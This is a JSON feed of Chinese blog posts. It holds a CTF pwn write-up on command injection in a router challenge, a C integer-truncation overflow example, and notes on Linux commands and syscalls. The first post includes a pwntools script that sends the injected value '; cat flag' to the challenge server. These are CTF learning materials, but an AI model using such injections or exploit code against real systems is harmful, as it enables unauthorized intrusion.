{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"linux\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "title": "bjdctf_2020_router(Linux命令)",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序\"><a class=\"anchor\" href=\"#1分析程序\">#</a> 1. 分析程序</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/24/pP7E8Fx.png\" alt=\"\" /><br />\n64 位程序，开启了 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7Eg1S.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/25/pP7EIkq.md.png\" alt=\"\" /></p>\n<p>发现 <code>case 1</code>  中有后门函数，利用 <code>strcat</code>  函数进行拼接，那么我们就可以通过指令的连续执行来获取 flag</p>\n<p>通过  <code>;</code>  符合就可以分隔连续执行 <code>linux</code>  命令，那么我们只需要输入 <code>; cat flag</code>  就能得到 flag</p>\n<h1 id=\"2exp其实完全不需要直接nc连接就可以\"><a class=\"anchor\" href=\"#2exp其实完全不需要直接nc连接就可以\">#</a> 2.exp (其实完全不需要，直接 nc 连接就可以):</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27288</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"choose:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"address:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">\"; cat flag\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP705fx.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/ctf%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97pwn/8.2.3/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/ctf%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97pwn/8.2.3/",
            "title": "第八章-8.2.3（整数溢出）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"环境一般情况下不会变动\"><a class=\"anchor\" href=\"#环境一般情况下不会变动\">#</a> 环境（一般情况下不会变动）</h1>\n<p>Ubuntu22.10<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/25/oJIREwOG.png\" alt=\"\" /><br />\nglibc：2.36-0ubuntu4<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/25/Caap7dxz.png\" alt=\"\" /></p>\n<h1 id=\"1程序源代码\"><a class=\"anchor\" href=\"#1程序源代码\">#</a> 1. 程序源代码</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">validate_passwd</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>passwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span>       </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">char</span> passwd_buf<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> passwd_len <span class=\"token operator\">=</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>passwd_len<span class=\"token operator\">>=</span><span class=\"token number\">4</span><span class=\"token operator\">&amp;&amp;</span>passwd_len<span class=\"token operator\">&lt;=</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"goot!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>passwd_buf<span class=\"token punctuation\">,</span>passwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bad!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span>       </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">validate_passwd</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"2分析\"><a class=\"anchor\" href=\"#2分析\">#</a> 2. 分析</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7csUg.png\" alt=\"\" /></p>\n<p><code>strlen</code>  返回值为 <code>size_t</code>  类型（无符号整数），而却保存到 <code>unsigned char</code>  类型中，这样会导致截断</p>\n<p>当我们输入字符长度为  <code>0000 0001 0000 0101</code>  (261) 时，转为 <code>unsigned char </code> 类型会变成 <code>0000 0101</code> （5），也就意味着通过这种方式能绕过后续的判断</p>\n<p>然后，我们输入的字符串长度比较长可以导致栈溢出</p>\n<h1 id=\"3编译加调试\"><a class=\"anchor\" href=\"#3编译加调试\">#</a> 3. 编译加调试</h1>\n<p>编译<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/25/4Bx86R3F.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "url": "https://vvwwvv.cn/2023/09/19/Linux/Linux%E5%91%BD%E4%BB%A4%E5%92%8C%E5%87%BD%E6%95%B0/",
            "title": "Linux命令和函数",
            "date_published": "2023-09-19T12:05:56.000Z",
            "content_html": "<h1 id=\"1linux执行多个命令shell命令\"><a class=\"anchor\" href=\"#1linux执行多个命令shell命令\">#</a> 1.Linux 执行多个命令（shell 命令）</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#逐条执行命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#前面的成功执行后面才执行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> echoo <span class=\"token number\">2</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span> <span class=\"token comment\">#2 出错，不会执行 echo3 ，echo4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#前一条命令失败然后才继续执行后面的命令</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\">#当第一个执行成功时，后面的就都不会执行；当第一个命令失败时，就开始执行 echo2，后面同理</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#混合使用分隔符</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># 因为 || 分隔符，按照 顺序 只要前面三个执行成功一个其他的就不执行，然后执行 echo4（因为 &amp;&amp; 前面的被看作一个整体，一个成功就视为成功，就执行 echo 4）</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<h1 id=\"2命令输出重定向\"><a class=\"anchor\" href=\"#2命令输出重定向\">#</a> 2. 命令输出重定向</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令执行结果输出到 file 中，命令的输出结果覆盖原有文件的内容（会清空旧内容）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">>></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令的输出结果输出到 file 文件的原内容的下一行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">&lt;</span>  <span class=\"token function\">file</span> <span class=\"token comment\"># 将输入重定向到 file</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1zaGVsbC1pby1yZWRpcmVjdGlvbnMuaHRtbA==\">https://www.runoob.com/linux/linux-shell-io-redirections.html</span></p>\n<h1 id=\"3fork函数\"><a class=\"anchor\" href=\"#3fork函数\">#</a> 3.fork () 函数</h1>\n<p>fork 函数用于创建一个进程，所创建的进程 <strong>复制父进程的代码段 / 数据段 / BSS 段 / 堆 / 栈等所有用户空间信息</strong> ；在内核中操作系统重新为其申请了一个 PCB，并使用父进程的 PCB 进行初始化；</p>\n<p>父进程与子进程的 pid 不同，<strong>执行顺序也不一定，要看系统的进程调度策略</strong></p>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>fork 调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<ol>\n<li>\n<pre><code>在父进程中，fork返回新创建子进程的进程ID；\n</code></pre>\n</li>\n<li>\n<pre><code>在子进程中，fork返回0；\n</code></pre>\n</li>\n<li>\n<p>如果出现错误，fork 返回一个负值；</p>\n<p>子进程的 fork（）返回值为 0  #第一次返回（不分先后，第一次返回也可能是父进程的 fork）<br />\n父进程的 fork（）返回值为子进程的 pid  #第二次返回</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nja2x1di9hcnRpY2xlL2RldGFpbHMvMTA5MTY5OTQx\">https://blog.csdn.net/cckluv/article/details/109169941</span></p>\n<h1 id=\"4linux下的exec命令\"><a class=\"anchor\" href=\"#4linux下的exec命令\">#</a> 4.Linux 下的 exec 命令</h1>\n<ol>\n<li>在一个 shell 里面，执行 <code>exec ls；</code> 那么，当列出了当前目录后，这个 shell 就自己退出了，因为这个 <code>shell进程已被替换为仅仅执行ls命令的一个进程</code> ，执行结束自然也就退出了 。</li>\n<li>exec 文件重定向，可以将文件的重定向就看为是 shell 程序的文件重定向， <code>当exec命令来对文件描述符操作的时候，就不会替换shell，而且操作完成后，还会继续执行接下来的命令。</code></li>\n</ol>\n<p>应用：可以 <code>重新开启标准输出流</code> ：</p>\n<p><code>exec （cat [文件名]）1&gt;&amp;0</code> , 使文件的标准输出流到标准输入里 (在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYnVsaC9hcnRpY2xlcy8xMjc2MDYxNy5odG1s\">https://www.cnblogs.com/bulh/articles/12760617.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMTg2MTIzL2FydGljbGUvZGV0YWlscy84MjE5MDc3Ng==\">https://blog.csdn.net/qq_31186123/article/details/82190776</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "url": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "title": "Linux之系统调用",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"一系统调用\"><a class=\"anchor\" href=\"#一系统调用\">#</a> 一。系统调用</h1>\n<p>系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。</p>\n<p>系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，<strong>64 位程序 (X64 CPU) 提供调用 syscall</strong> 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。</p>\n<p>上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。</p>\n<p>不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）</p>\n<h1 id=\"二32位程序系统调用\"><a class=\"anchor\" href=\"#二32位程序系统调用\">#</a> 二.<strong>32 位程序</strong>系统调用</h1>\n<h2 id=\"1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\"><a class=\"anchor\" href=\"#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\">#</a> 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，</h2>\n<pre><code class=\"language-C\">void system_call()\n&#123;\n    ...\n    // 变量 eax 代表 eax 寄存器的值\n    syscall = sys_call_table[eax];\n    eax = syscall();\n    ...\n&#125;\n</code></pre>\n<p>sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下</p>\n<pre><code class=\"language-C\">long sys_call_table[] = &#123;\n   sys_ni_syscall,\n   sys_exit,\n   sys_fork,\n   sys_read,\n   sys_write,\n   sys_open,\n   sys_close,\n   ...\n&#125;;\n</code></pre>\n<h2 id=\"用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\"><a class=\"anchor\" href=\"#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\">#</a> 用户调用<strong>系统调用</strong>时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把<strong>返回值保存到 eax 寄存器中</strong></h2>\n<h2 id=\"用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\"><a class=\"anchor\" href=\"#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\">#</a> 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：</h2>\n<ul>\n<li>第 1 个参数放置在 ebx  寄存器。</li>\n<li>第 2 个参数放置在 ecx  寄存器。</li>\n<li>第 3 个参数放置在 edx  寄存器。</li>\n<li>第 4 个参数放置在 esi   寄存器。</li>\n<li>第 5 个参数放置在 edi   寄存器。</li>\n<li>第 6 个参数放置在 ebp 寄存器。</li>\n</ul>\n<h2 id=\"linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\"><a class=\"anchor\" href=\"#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\">#</a> Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。</h2>\n<p>x86 架构系统调用漏洞利用参考: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==\">https://bbs.kanxue.com/thread-248682.htm</span></p>\n<p>参考文章: <span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9jcklycg==\">Linux 下 syscall 系统调用原理及实现</span></p>\n<h1 id=\"三64位系统系统调用\"><a class=\"anchor\" href=\"#三64位系统系统调用\">#</a> 三.<strong>64 位系统</strong>系统调用</h1>\n<h2 id=\"164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\"><a class=\"anchor\" href=\"#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\">#</a> 1.64 位（x64 架构）系统中，Linux 通过<strong> syscall 指令</strong>来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样</h2>\n<h2 id=\"传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\"><a class=\"anchor\" href=\"#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\">#</a> 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入<strong> rdi、rsi、rdx 寄存器</strong>中：</h2>\n<ul>\n<li>第 1 个参数放置在 rdi  寄存器。</li>\n<li>第 2 个参数放置在 rsi  寄存器。</li>\n<li>第 3 个参数放置在 rdx  寄存器。</li>\n<li>第 4 个参数放置在 rcx  寄存器。</li>\n<li>第 5 个参数放置在 r8  寄存器。</li>\n<li>第 6 个参数放置在 r9  寄存器。</li>\n</ul>\n<h2 id=\"系统调用完成后把返回值保存到rax寄存器中\"><a class=\"anchor\" href=\"#系统调用完成后把返回值保存到rax寄存器中\">#</a> 系统调用完成后，把<strong>返回值保存到 rax 寄存器中</strong></h2>\n<h1 id=\"四32位系统与64位系统-对比系统调用不同\"><a class=\"anchor\" href=\"#四32位系统与64位系统-对比系统调用不同\">#</a> 四.32 位系统与 64 位系统 <strong>对比系统调用不同</strong></h1>\n<h2 id=\"1系统调用号不同\"><a class=\"anchor\" href=\"#1系统调用号不同\">#</a> 1. 系统调用号不同</h2>\n<h3 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_32_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_32_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_restart_syscall 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_exit 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_fork 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_read 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_write 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_open 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_close 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_waitpid 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_creat 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_link 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_unlink 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_execve 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_chdir 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_time 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_mknod 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_chmod 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_lchown 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_break 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_oldstat 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_mount 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_umount 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_setuid 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_getuid 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_stime 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_ptrace 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_oldfstat 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_pause 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_utime 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_stty 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_gtty 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_access 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_nice 